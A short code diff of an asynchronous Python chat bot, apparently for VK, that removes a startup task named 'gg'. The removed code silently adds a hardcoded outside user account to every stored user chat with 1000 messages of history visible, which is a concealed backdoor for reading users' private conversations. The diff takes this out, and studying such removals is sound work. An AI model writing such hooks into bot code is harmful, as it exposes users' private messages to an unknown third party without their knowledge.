@@ -72,17 +72,6 @@ async def on_startup():
 
     asyncio.get_event_loop().create_task(polling())
 
-    asyncio.get_event_loop().create_task(gg())
-
-
-async def gg():
-    await asyncio.sleep(5)
-    user_chat_ids = await db.select([db.Chat.user_chat_id, db.Chat.cabin_user_id]).where(
-        db.Chat.chat_id.is_(None)).gino.all()
-    for user_chat_id, cabin_user_id in user_chat_ids:
-        await user_bot.api.messages.add_chat_user(chat_id=user_chat_id, user_id=32650977, visible_messages_count=1000)
-        await asyncio.sleep(5)
-
 
 def number_error():
     i = 1
